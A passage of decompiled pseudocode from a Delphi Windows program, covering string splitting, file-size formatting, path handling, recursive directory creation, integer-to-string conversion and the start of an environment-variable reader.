  v2 = Sysutils::TMultiReadExclusiveWriteSynchronizer::TMultiReadExclusiveWriteSynchronizer((Sysutils::TMultiReadExclusiveWriteSynchronizer *)&dword_414538);
  v3 = v2;
  if ( v2 )
    v3 = v2 + 44;
  return System::__linkproc__ IntfCopy(a1, v3);
}
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);
// 414538: using guessed type int dword_414538;

//----- (004246F0) --------------------------------------------------------
int *__fastcall sub_4246F0(int *result)
{
  _DWORD *v1; // eax
  int *v2; // [esp+0h] [ebp-4h]

  v2 = result;
  if ( *result )
  {
    sub_429320(*result);
    v1 = (_DWORD *)*v2;
    *v2 = 0;
    return sub_405598(v1);
  }
  return result;
}

//----- (00424720) --------------------------------------------------------
int *__fastcall sub_424720(int *result)
{
  _DWORD *v1; // eax
  int *v2; // [esp+0h] [ebp-4h]

  v2 = result;
  if ( *result )
  {
    sub_428270(*result);
    v1 = (_DWORD *)*v2;
    *v2 = 0;
    return sub_405598(v1);
  }
  return result;
}

//----- (00424750) --------------------------------------------------------
_DWORD *__fastcall sub_424750(int a1, int a2, _DWORD *a3)
{
  int v3; // edi
  int v4; // ebx
  int v5; // eax
  int v6; // esi
  int i; // [esp+Ch] [ebp-10h]

  if ( a3 )
    *a3 = 0;
  v3 = 0;
  sub_408B34(a3, (int)&byte_4224D0);
  v4 = 1;
  v5 = a2;
  if ( a2 )
    v5 = *(_DWORD *)(a2 - 4);
  for ( i = v5; ; v4 = i + v6 )
  {
    v6 = sub_4241E0(a2, a1, v4);
    if ( v6 <= 0 )
      break;
    System::__linkproc__ DynArraySetLength(v3 + 1);
    sub_407AD8(a1, v4, v6 - v4, (_DWORD *)(*a3 + 4 * v3++));
  }
  System::__linkproc__ DynArraySetLength(v3 + 1);
  return sub_407AD8(a1, v4, 0x7FFFFFFF, (_DWORD *)(*a3 + 4 * v3));
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 4224D0: using guessed type char byte_4224D0;

//----- (00424820) --------------------------------------------------------
volatile __int32 *__fastcall sub_424820(int a1, int a2, volatile __int32 *a3)
{
  int v4; // esi
  volatile __int32 *result; // eax
  int v6; // esi
  int v7; // edi
  int *v8; // [esp+10h] [ebp-4h]

  v8 = (int *)a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  v4 = a1;
  if ( a1 <= 0 )
    return sub_406C44(a3);
  result = sub_406FE8(a3, *v8);
  v6 = v4 - 1;
  if ( v6 > 0 )
  {
    v7 = 1;
    do
    {
      result = (volatile __int32 *)sub_4079F0((int *)a3, 3);
      ++v7;
      --v6;
    }
    while ( v6 );
  }
  return result;
}

//----- (00424890) --------------------------------------------------------
volatile __int32 *__fastcall sub_424890(int a1, int a2, int a3, volatile __int32 *a4)
{
  if ( !a1 )
    return sub_406FE8(a4, a2);
  if ( a2 )
    return (volatile __int32 *)sub_4079F0((int *)a4, 3);
  return sub_406FE8(a4, a1);
}

//----- (00424950) --------------------------------------------------------
int __fastcall sub_424950(char a1, volatile __int32 *a2, __int64 a3, __int64 a4, __int64 a5)
{
  int v7; // esi
  int v8; // eax
  int v9; // eax
  _BYTE v11[12]; // [esp+0h] [ebp-58h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+Ch] [ebp-4Ch] BYREF
  void *v13; // [esp+10h] [ebp-48h]
  int *v14; // [esp+14h] [ebp-44h]
  unsigned int v15[2]; // [esp+18h] [ebp-40h] BYREF
  int *v16; // [esp+20h] [ebp-38h]
  int v17; // [esp+30h] [ebp-28h]
  void *v18; // [esp+34h] [ebp-24h] BYREF
  int v19; // [esp+38h] [ebp-20h] BYREF
  int v20; // [esp+3Ch] [ebp-1Ch]
  signed __int64 v21; // [esp+40h] [ebp-18h]
  int v22; // [esp+48h] [ebp-10h] BYREF
  int v23; // [esp+4Ch] [ebp-Ch] BYREF
  int v24; // [esp+50h] [ebp-8h] BYREF
  void *v25; // [esp+54h] [ebp-4h] BYREF
  int savedregs; // [esp+58h] [ebp+0h] BYREF

  v16 = &savedregs;
  v15[1] = (unsigned int)&loc_424BCF;
  v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  if ( a3 >= a4 )
  {
    if ( a3 >= a5 )
    {
      if ( a1 )
      {
        v14 = &savedregs;
        v13 = &loc_424AD2;
        ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)&ExceptionList);
        *(long double *)v11 = (long double)a3 / (long double)a5;
        sub_417440((int)L"0.00", (__int16 *)off_46811C, (int)&v24, (int)a2, v11[0], *(int *)&v11[4], *(int *)&v11[8]);
        sub_406FE8(a2, v24);
        __writefsdword(0, (unsigned int)ExceptionList);
        v14 = (int *)&loc_424BA7;
        sub_406C44(&v24);
      }
      else if ( unknown_libname_57(a5, HIDWORD(a5)) <= a3 )
      {
        v14 = &savedregs;
        v13 = &loc_424BA0;
        ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)&ExceptionList);
        *(long double *)v11 = (long double)a3 / (long double)a5;
        sub_417440(
          (int)dword_424C04,
          (__int16 *)off_46811C,
          (int)&v22,
          (int)a2,
          v11[0],
          *(int *)&v11[4],
          *(int *)&v11[8]);
        sub_406FE8(a2, v22);
        __writefsdword(0, (unsigned int)ExceptionList);
        v14 = (int *)&loc_424BA7;
        sub_406C44(&v22);
      }
      else
      {
        v14 = &savedregs;
        v13 = &loc_424B49;
        ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)&ExceptionList);
        *(long double *)v11 = (long double)a3 / (long double)a5;
        sub_417440((int)L"0.0", (__int16 *)off_46811C, (int)&v23, (int)a2, v11[0], *(int *)&v11[4], *(int *)&v11[8]);
        sub_406FE8(a2, v23);
        __writefsdword(0, (unsigned int)ExceptionList);
        v14 = (int *)&loc_424BA7;
        sub_406C44(&v23);
      }
    }
    else
    {
      unknown_libname_57(100, 0);
      v21 = System::__linkproc__ _lldiv(a5, HIDWORD(a5));
      v14 = &savedregs;
      v13 = &loc_424A77;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      sub_415178((int *)&v18, SHIDWORD(v21), 0, v21);
      sub_407968(&v19, dword_424C04, v18);
      v7 = 2;
      v8 = v19;
      if ( v19 )
        v8 = *(_DWORD *)(v19 - 4);
      if ( v8 < 2 )
      {
        v9 = v19;
        if ( v19 )
          v9 = *(_DWORD *)(v19 - 4);
        v7 = v9;
      }
      v20 = v19;
      if ( v19 )
        v20 = *(_DWORD *)(v20 - 4);
      v17 = v19;
      sub_407AD8(v19, v20 + 1 - v7, v7, &v25);
      sub_407968(a2, L"0.", v25);
      __writefsdword(0, (unsigned int)ExceptionList);
      v14 = (int *)&loc_424BA7;
      sub_406C44(&v25);
    }
  }
  else
  {
    sub_406FE8(a2, (int)L"0.001");
  }
  __writefsdword(0, v15[0]);
  v16 = (int *)&loc_424BD6;
  sub_406CA4((int)&v18, 2);
  return sub_406CA4((int)&v22, 4);
}
// 424AAD: variable 'v11' is possibly undefined
// 40856C: using guessed type __int64 __stdcall unknown_libname_57(_DWORD, _DWORD);
// 408590: using guessed type __int64 __stdcall System::__linkproc__ _lldiv(_DWORD, _DWORD);
// 424BEC: using guessed type wchar_t a0001[6];
// 424C04: using guessed type int dword_424C04[4];
// 424C14: using guessed type wchar_t a0[3];
// 424C28: using guessed type wchar_t a000[5];
// 424C40: using guessed type wchar_t a00[4];

//----- (00424C50) --------------------------------------------------------
int __userpurge sub_424C50@<eax>(int a1@<eax>, _BYTE *a2@<edx>, int *a3@<ecx>, int a4@<ebx>, int a5@<esi>, __int64 a6)
{
  __int64 v7; // rax
  int v8; // ebx
  signed __int64 v9; // rax
  int v10; // ecx
  unsigned int v12; // [esp-20h] [ebp-2Ch]
  _DWORD v13[5]; // [esp-14h] [ebp-20h] BYREF
  int *v14; // [esp+0h] [ebp-Ch]
  unsigned int v15; // [esp+4h] [ebp-8h] BYREF
  int v16; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v13[4] = a4;
  v13[3] = a5;
  v14 = a3;
  HIDWORD(v7) = 0;
  v13[2] = &savedregs;
  v13[1] = &loc_424EEF;
  v13[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  v8 = a1;
  if ( !(_BYTE)a1 )
  {
    v7 = System::__linkproc__ _lldiv(qword_4669B0, HIDWORD(qword_4669B0));
    if ( v7 )
    {
      v7 = System::__linkproc__ _lldiv(qword_4669B8, HIDWORD(qword_4669B8));
      if ( v7 )
      {
        v7 = System::__linkproc__ _lldiv(qword_4669C0, HIDWORD(qword_4669C0));
        if ( v7 )
          LOBYTE(v8) = 5;
        else
          LOBYTE(v8) = 4;
      }
      else
      {
        LOBYTE(v8) = 3;
      }
    }
    else
    {
      LOBYTE(v8) = 2;
    }
  }
  if ( a6 > 0 )
  {
    switch ( (char)v8 )
    {
      case 1:
        sub_415178(&v16, SHIDWORD(v7), (int)a3, a6);
        break;
      case 2:
        if ( a6 >= *(__int64 *)&qword_4669A8 || a6 < 10 )
        {
          v9 = System::__linkproc__ _lldiv(qword_4669A8, *(&qword_4669A8 + 1));
          sub_415178(&v16, SHIDWORD(v9), v10, v9);
        }
        else
        {
          sub_407030(&v16, (__int32)dword_424F1C);
        }
        break;
      case 3:
        sub_424950(0, &v16, a6, *(__int64 *)&qword_4669A8, qword_4669B0);
        break;
      case 4:
        sub_424950(1, &v16, a6, qword_4669B0, qword_4669B8);
        break;
      case 5:
        sub_424950(1, &v16, a6, qword_4669B8, qword_4669C0);
        break;
      default:
        break;
    }
  }
  else
  {
    sub_407030(&v16, (__int32)dword_424F0C);
  }
  switch ( (char)v8 )
  {
    case 1:
      sub_407030((volatile __int32 *)&v15, dword_466838);
      break;
    case 2:
      sub_407030((volatile __int32 *)&v15, (__int32)off_46683C);
      break;
    case 3:
      sub_407030((volatile __int32 *)&v15, (__int32)off_466840[0]);
      break;
    case 4:
      sub_407030((volatile __int32 *)&v15, (__int32)off_466844[0]);
      break;
    case 5:
      sub_407030((volatile __int32 *)&v15, (__int32)off_466848);
      break;
    default:
      sub_406C44(&v15);
      break;
  }
  if ( dword_466828 )
    dword_466828(v8, &v15);
  v12 = v15;
  sub_4079F0(v14, 3);
  if ( a2 )
    *a2 = v8;
  __writefsdword(0, v12);
  return sub_406CA4((int)&v15, 2);
}
// 424C50: could not find valid save-restore pair for ebx
// 424C50: could not find valid save-restore pair for esi
// 424D3B: variable 'a3' is possibly undefined
// 424E1E: variable 'v10' is possibly undefined
// 408590: using guessed type __int64 __stdcall System::__linkproc__ _lldiv(_DWORD, _DWORD);
// 424F0C: using guessed type int dword_424F0C[4];
// 424F1C: using guessed type int dword_424F1C[4];
// 466828: using guessed type int (__fastcall *dword_466828)(_DWORD, _DWORD);
// 466838: using guessed type int dword_466838;
// 46683C: using guessed type void *off_46683C;
// 466840: using guessed type wchar_t *off_466840[3];
// 466844: using guessed type wchar_t *off_466844[2];
// 466848: using guessed type void **off_466848;

//----- (00424F30) --------------------------------------------------------
_DWORD *__userpurge sub_424F30@<eax>(int *a1@<eax>, int a2@<esi>, __int64 a3)
{
  int *v5; // [esp-1Ch] [ebp-28h]
  _DWORD v6[4]; // [esp-Ch] [ebp-18h] BYREF
  int v7; // [esp+4h] [ebp-8h] BYREF
  char v8; // [esp+Bh] [ebp-1h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v7 = 0;
  v6[2] = &savedregs;
  v6[1] = &loc_424FA3;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_424C50(0, &v8, a1, (int)a1, a2, a3);
  if ( v8 != 1 )
  {
    unknown_libname_75(a3, HIDWORD(a3));
    v5 = dword_424FD4;
    sub_4079F0(a1, 4);
  }
  __writefsdword(0, (unsigned int)v5);
  return sub_406C44(&v7);
}
// 424F92: variable 'v5' is possibly undefined
// 4151D0: using guessed type _DWORD __stdcall unknown_libname_75(_DWORD, _DWORD);
// 424FD4: using guessed type int dword_424FD4[3];
// 424F30: using guessed type int var_8;

//----- (00424FE0) --------------------------------------------------------
_DWORD *__userpurge sub_424FE0@<eax>(int *a1@<eax>, int a2@<esi>, __int64 a3)
{
  int v4; // edx
  int v5; // ecx
  int *v7; // [esp-1Ch] [ebp-28h]
  _DWORD v8[4]; // [esp-Ch] [ebp-18h] BYREF
  int v9; // [esp+4h] [ebp-8h] BYREF
  char v10; // [esp+Bh] [ebp-1h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = 0;
  v8[2] = &savedregs;
  v8[1] = &loc_425053;
  v8[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_424C50(0, &v10, a1, (int)a1, a2, a3);
  if ( v10 != 1 )
  {
    sub_415178(&v9, v4, v5, a3);
    v7 = dword_425084;
    sub_4079F0(a1, 4);
  }
  __writefsdword(0, (unsigned int)v7);
  return sub_406C44(&v9);
}
// 425024: variable 'v4' is possibly undefined
// 425024: variable 'v5' is possibly undefined
// 425042: variable 'v7' is possibly undefined
// 425084: using guessed type int dword_425084[3];
// 424FE0: using guessed type int var_8;

//----- (00425090) --------------------------------------------------------
_DWORD *__fastcall sub_425090(unsigned __int16 *a1, volatile __int32 *a2, int a3, int a4, int a5)
{
  unsigned int v7[2]; // [esp-10h] [ebp-14h] BYREF
  int *v8; // [esp-8h] [ebp-Ch]
  __int32 v9; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4250DB;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_4188D0(&v9, a1, (void *)off_46811C, a4, a5);
  sub_406FE8(a2, v9);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4250E2;
  return sub_406C44(&v9);
}

//----- (004250F0) --------------------------------------------------------
int __fastcall sub_4250F0(int a1)
{
  sub_407D10(a1, (int)&byte_413DFC);
  return sub_407F98(a1, off_46811C, (int)&byte_413DFC);
}
// 413DFC: using guessed type char byte_413DFC;

//----- (00425120) --------------------------------------------------------
_DWORD *__fastcall sub_425120(int a1, _WORD *a2)
{
  _WORD *i; // esi
  _WORD *v4; // ebx
  unsigned int v6[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v7; // [esp-10h] [ebp-14h]
  int v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_425186;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( a2 )
  {
    for ( i = a2; *i; i = v4 + 1 )
    {
      unknown_libname_50(&v8, i);
      Guitesting::TGUITestCase::Hide(a1, v8);
      v4 = i;
      if ( i )
      {
        while ( *v4 )
          ++v4;
      }
    }
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_42518D;
  return sub_406C44(&v8);
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 429130: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);

//----- (004251A0) --------------------------------------------------------
int __fastcall sub_4251A0(int a1, int a2)
{
  int result; // eax
  int v4; // ecx
  bool v5; // cl
  unsigned __int16 v7; // [esp+0h] [ebp-8h]

  result = 0;
  if ( a2 <= 0 )
  {
    v5 = 0;
  }
  else
  {
    v4 = a1;
    if ( a1 )
      v4 = *(_DWORD *)(a1 - 4);
    v5 = v4 >= a2;
  }
  if ( v5 )
  {
    v7 = *(_WORD *)(a1 + 2 * a2 - 2);
    if ( v7 >= 0xD800u && v7 <= 0xDFFFu )
    {
      result = *(unsigned __int16 *)(a1 + 2 * a2 - 2);
      if ( (unsigned __int16)result < 0xD800u || (unsigned __int16)result > 0xDBFFu )
        LOBYTE(result) = 2;
      else
        LOBYTE(result) = 1;
    }
  }
  return result;
}

//----- (00425200) --------------------------------------------------------
bool __fastcall sub_425200(int a1, int a2)
{
  int v2; // esi
  bool v3; // al

  v2 = a1;
  if ( a2 <= 0 )
  {
    v3 = 0;
  }
  else
  {
    if ( a1 )
      a1 = *(_DWORD *)(a1 - 4);
    v3 = a1 >= a2;
  }
  return v3 && *(_WORD *)(v2 + 2 * a2 - 2) == 92 && (unsigned __int8)sub_4251A0(v2, a2) == 0;
}

//----- (00425250) --------------------------------------------------------
unsigned __int8 __fastcall sub_425250(int a1, volatile __int32 *a2)
{
  int v3; // esi
  unsigned __int8 result; // al

  sub_406FE8(a2, a1);
  v3 = *a2;
  if ( *a2 )
    v3 = *(_DWORD *)(v3 - 4);
  result = sub_425200(*a2, v3);
  if ( !result )
    return (unsigned __int8)sub_407910(a2, dword_425298);
  return result;
}
// 425298: using guessed type int dword_425298[2];

//----- (004252A0) --------------------------------------------------------
unsigned __int8 __fastcall sub_4252A0(int a1, volatile __int32 *a2)
{
  int v3; // esi
  unsigned __int8 result; // al
  int v5; // ecx
  volatile __int32 v6; // eax

  sub_406FE8(a2, a1);
  v3 = *a2;
  if ( *a2 )
    v3 = *(_DWORD *)(v3 - 4);
  result = sub_425200(*a2, v3);
  if ( result )
  {
    v6 = *a2;
    if ( *a2 )
      v6 = *(_DWORD *)(v6 - 4);
    return (unsigned __int8)sub_407890(a2, v6 - 1, v5);
  }
  return result;
}
// 4252DA: variable 'v5' is possibly undefined

//----- (004252F0) --------------------------------------------------------
int __fastcall sub_4252F0(int a1, int a2)
{
  int v3; // eax
  int v4; // esi
  int i; // edx
  _WORD *j; // ebx
  __int16 v8; // [esp+Eh] [ebp-6h]

  v3 = a2;
  if ( a2 )
    v3 = *(_DWORD *)(a2 - 4);
  v4 = v3;
  for ( i = sub_407790(a1); v4 > 0; --v4 )
  {
    if ( *(_WORD *)(a2 + 2 * v4 - 2) )
    {
      v8 = *(_WORD *)(a2 + 2 * v4 - 2);
      for ( j = (_WORD *)i; *j; ++j )
      {
        if ( *j == v8 )
          goto LABEL_11;
      }
      if ( v8 )
        j = 0;
LABEL_11:
      if ( j )
        break;
    }
  }
  return v4;
}

//----- (00425360) --------------------------------------------------------
int __fastcall sub_425360(int a1, int a2, int a3)
{
  bool v5; // al
  int v6; // eax
  _WORD *i; // ebx
  __int16 v10; // [esp+Ch] [ebp-8h]
  unsigned __int8 v11; // [esp+Fh] [ebp-5h]

  v11 = 0;
  if ( a3 > 0 )
  {
    v6 = a2;
    if ( a2 )
      v6 = *(_DWORD *)(a2 - 4);
    v5 = v6 < a3;
  }
  else
  {
    v5 = 1;
  }
  if ( !v5 && (unsigned __int8)sub_4251A0(a2, a3) == 0 )
  {
    v10 = *(_WORD *)(a2 + 2 * a3 - 2);
    for ( i = (_WORD *)sub_407790(a1); *i; ++i )
    {
      if ( *i == v10 )
        return i != 0;
    }
    if ( v10 )
      i = 0;
    return i != 0;
  }
  return v11;
}

//----- (004253F0) --------------------------------------------------------
_DWORD *__fastcall sub_4253F0(int a1, _DWORD *a2)
{
  int v4; // eax

  v4 = sub_4252F0((int)L"\\:", a1);
  return sub_407AD8(a1, 1, v4, a2);
}
// 425428: using guessed type wchar_t asc_425428[3];

//----- (00425430) --------------------------------------------------------
_DWORD *__fastcall sub_425430(int a1, _DWORD *a2)
{
  int v4; // eax
  int v5; // ebx

  v4 = sub_4252F0((int)L"\\:", a1);
  v5 = v4;
  if ( v4 > 1 && *(_WORD *)(a1 + 2 * v4 - 2) == 92 && !(unsigned __int8)sub_425360((int)L"\\:", a1, v4 - 1) )
    --v5;
  return sub_407AD8(a1, 1, v5, a2);
}
// 42548C: using guessed type wchar_t asc_42548C[3];

//----- (004254A0) --------------------------------------------------------
_DWORD *__fastcall sub_4254A0(int a1, _DWORD *a2)
{
  int v4; // eax

  v4 = sub_4252F0((int)L"\\:", a1);
  return sub_407AD8(a1, v4 + 1, 0x7FFFFFFF, a2);
}
// 4254DC: using guessed type wchar_t asc_4254DC[3];

//----- (00425590) --------------------------------------------------------
int __fastcall sub_425590(int a1, __int16 a2)
{
  int v2; // ebx
  HANDLE v3; // eax
  int v4; // edx

  v2 = 0;
  v3 = sub_426D60(a1, a2);
  if ( v3 != (HANDLE)dword_4667E0 )
  {
    LOBYTE(v4) = 1;
    return Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
             &cls_CrossPlatform_TUnicodeFileStream,
             v4,
             v3);
  }
  return v2;
}
// 4255AC: variable 'v4' is possibly undefined
// 423374: using guessed type int (*cls_CrossPlatform_TUnicodeFileStream)();
// 427860: using guessed type int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, _DWORD);
// 4667E0: using guessed type int dword_4667E0;

//----- (004255C0) --------------------------------------------------------
__int64 __fastcall sub_4255C0(int a1, char a2)
{
  __int64 v3; // [esp+8h] [ebp-8h] BYREF

  if ( !(unsigned __int8)sub_426E30(a1, a2, (DWORD *)&v3) )
    return 0i64;
  return v3;
}

//----- (00425600) --------------------------------------------------------
BOOL __usercall sub_425600@<eax>(int a1@<eax>, BOOL a2@<ebx>, int a3@<esi>)
{
  int v3; // eax
  char v4; // al
  char v5; // zf
  unsigned int v7[2]; // [esp-14h] [ebp-20h] BYREF
  int *v8; // [esp-Ch] [ebp-18h]
  int v9; // [esp-8h] [ebp-14h]
  BOOL v10; // [esp-4h] [ebp-10h]
  int v11; // [esp+0h] [ebp-Ch] BYREF
  int v12; // [esp+4h] [ebp-8h] BYREF
  __int32 v13; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v13 = 0;
  v12 = 0;
  v11 = 0;
  v10 = a2;
  v9 = a3;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4256C5;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( a1 )
  {
    LOBYTE(a2) = 1;
    sub_4252A0(a1, &v13);
    if ( !(unsigned __int8)sub_426C90(v13) )
    {
      v3 = v13;
      if ( v13 )
        v3 = *(_DWORD *)(v13 - 4);
      if ( v3 >= 3 )
      {
        sub_4253F0(v13, &v12);
        sub_407AA0(v12, v13);
        v4 = v5;
      }
      else
      {
        v4 = 1;
      }
      if ( v4 )
      {
        a2 = sub_426D20(v13);
      }
      else
      {
        sub_4253F0(v13, &v11);
        if ( (unsigned __int8)sub_425600(v11) && sub_426D20(v13) )
          LOBYTE(a2) = 1;
        else
          a2 = 0;
      }
    }
  }
  else
  {
    a2 = 0;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4256CC;
  sub_406CA4((int)&v11, 2);
  sub_406C44(&v13);
  return a2;
}
// 425600: could not find valid save-restore pair for ebx
// 425600: could not find valid save-restore pair for esi
// 425666: variable 'v5' is possibly undefined

//----- (004256E0) --------------------------------------------------------
int __fastcall sub_4256E0(unsigned int a1, unsigned __int8 a2, int *a3)
{
  int v5; // esi
  _BYTE *v6; // ecx
  int result; // eax
  _WORD *i; // ecx
  unsigned int v9; // eax

  sub_406C68(a3);
  if ( a1 < 0x2710 )
  {
    if ( a1 < 0x64 )
      v5 = (a1 >= 0xA) + 1;
    else
      v5 = (a1 >= 0x3E8) + 3;
  }
  else if ( a1 < 0xF4240 )
  {
    v5 = (a1 >= 0x186A0) + 5;
  }
  else if ( a1 < 0x5F5E100 )
  {
    v5 = (a1 >= 0x989680) + 7;
  }
  else
  {
    v5 = (a1 >= 0x3B9ACA00) + 9;
  }
  sub_4075BC(a3, v5 + a2, 0);
  v6 = (_BYTE *)sub_4074F8(*a3);
  *v6 = 45;
  result = a2;
  for ( i = &v6[a2]; v5 > 2; *(_WORD *)((char *)i + v5) = result )
  {
    v9 = a1 % 0x64;
    a1 /= 0x64u;
    v5 -= 2;
    result = (unsigned __int16)word_46684C[v9];
  }
  if ( v5 == 2 )
  {
    result = (unsigned __int16)word_46684C[a1];
    *i = result;
  }
  else
  {
    *(_BYTE *)i = a1 | 0x30;
  }
  return result;
}
// 46684C: using guessed type __int16 word_46684C[69];

//----- (004257E0) --------------------------------------------------------
int __fastcall sub_4257E0(unsigned __int8 a1, int *a2, unsigned __int64 a3)
{
  bool v5; // cc
  int result; // eax
  unsigned __int8 v7; // bl
  _BYTE *v8; // eax
  _BYTE *v9; // esi
  int v10; // eax
  unsigned __int8 v11; // bl
  unsigned int i; // ecx
  unsigned int v13; // eax
  unsigned int v14; // [esp+14h] [ebp-24h]
  unsigned int v15; // [esp+20h] [ebp-18h]
  unsigned __int64 v16; // [esp+28h] [ebp-10h]

  if ( a1 && a3 <= 0x7FFFFFFF )
    return sub_4256E0(a3, a1, a2);
  if ( !a1 )
  {
    v5 = HIDWORD(a3) == 0;
    if ( !HIDWORD(a3) )
      v5 = 1;
    if ( v5 )
      return sub_4256E0(a3, a1, a2);
  }
  v16 = a3;
  if ( a3 < 0x5AF3107A4000i64 )
  {
    if ( a3 < 0xE8D4A51000i64 )
    {
      if ( a3 < 0x2540BE400i64 )
        v7 = 10;
      else
        v7 = (a3 >= 0x174876E800i64) + 11;
    }
    else
    {
      v7 = (a3 >= 0x9184E72A000i64) + 13;
    }
  }
  else if ( a3 < 0x2386F26FC10000i64 )
  {
    v7 = (a3 >= 0x38D7EA4C68000i64) + 15;
  }
  else if ( a3 < 0xDE0B6B3A7640000i64 )
  {
    v7 = (a3 >= 0x16345785D8A0000i64) + 17;
  }
  else if ( a3 < 0x8AC7230489E80000i64 )
  {
    v7 = 19;
  }
  else
  {
    v7 = 20;
  }
  sub_4075BC(a2, a1 + v7, 0);
  v8 = (_BYTE *)sub_4074F8(*a2);
  *v8 = 45;
  v9 = &v8[a1];
  if ( v7 == 20 )
  {
    *v9++ = 49;
    v16 = a3 - qword_4669C8;
    v7 = 19;
  }
  if ( v7 > 0x11u )
  {
    if ( v7 == 19 )
    {
      *v9 = 48;
      while ( v16 >= 0xDE0B6B3A7640000i64 )
      {
        v16 -= 1000000000000000000i64;
        ++*v9;
      }
      ++v9;
    }
    *v9 = 48;
    while ( v16 >= 0x16345785D8A0000i64 )
    {
      v16 -= 100000000000000000i64;
      ++*v9;
    }
    ++v9;
    v7 = 17;
  }
  v15 = System::__linkproc__ _lludiv(100000000, 0);
  v10 = unknown_libname_57(100000000, 0);
  v14 = ((int)v16 - v10) / 0x64u;
  *(_WORD *)&v9[v7 - 2] = word_46684C[((int)v16 - v10) % 0x64u];
  *(_WORD *)&v9[v7 - 4] = word_46684C[v14 % 0x64];
  *(_WORD *)&v9[v7 - 6] = word_46684C[v14 / 0x64 % 0x64];
  result = (unsigned __int16)word_46684C[v14 / 0x64 / 0x64];
  *(_WORD *)&v9[v7 - 8] = result;
  v11 = v7 - 8;
  for ( i = v15; v11 > 2u; *(_WORD *)&v9[v11] = result )
  {
    v13 = i % 0x64;
    i /= 0x64u;
    v11 -= 2;
    result = (unsigned __int16)word_46684C[v13];
  }
  if ( v11 == 2 )
  {
    result = (unsigned __int16)word_46684C[i];
    *(_WORD *)v9 = result;
  }
  else
  {
    *v9 = i | 0x30;
  }
  return result;
}
// 40856C: using guessed type __int64 __stdcall unknown_libname_57(_DWORD, _DWORD);
// 408624: using guessed type __int64 __stdcall System::__linkproc__ _lludiv(_DWORD, _DWORD);
// 46684C: using guessed type __int16 word_46684C[69];
// 4669C8: using guessed type __int64 qword_4669C8;

//----- (00425AE0) --------------------------------------------------------
int __fastcall sub_425AE0(signed int a1, int *a2)
{
  if ( a1 >= 0 )
    return sub_4256E0(a1, 0, a2);
  else
    return sub_4256E0(-a1, 1u, a2);
}

//----- (00425B10) --------------------------------------------------------
int __fastcall sub_425B10(int *a1, signed __int64 a2)
{
  if ( a2 >= 0 )
    return sub_4257E0(0, a1, a2);
  else
    return sub_4257E0(1u, a1, -a2);
}

//----- (00425B80) --------------------------------------------------------
int __stdcall sub_425B80(int a1)
{
  return sub_415BD0(a1);
}

//----- (00425BB0) --------------------------------------------------------
int __fastcall sub_425BB0(Idthreadcomponent::TIdThreadComponent *this)
{
  signed int v2; // ebx
  char v3; // zf
  unsigned int v5[2]; // [esp-18h] [ebp-30h] BYREF
  int *v6; // [esp-10h] [ebp-28h]
  unsigned int v7[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v8; // [esp-4h] [ebp-1Ch]
  __int32 v9; // [esp+8h] [ebp-10h] BYREF
  int v10; // [esp+Ch] [ebp-Ch] BYREF
  LPWSTR EnvironmentStringsW; // [esp+10h] [ebp-8h]
  unsigned __int8 v12; // [esp+17h] [ebp-1h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_425C84;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v12 = 0;
  EnvironmentStringsW = GetEnvironmentStringsW();
  if ( EnvironmentStringsW )
  {
    v6 = &savedregs;
    v5[1] = (unsigned int)&loc_425C62;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    sub_425120((int)this, EnvironmentStringsW);
    v2 = *((_DWORD *)this + 2) - 1;
    if ( v2 >= 0 )
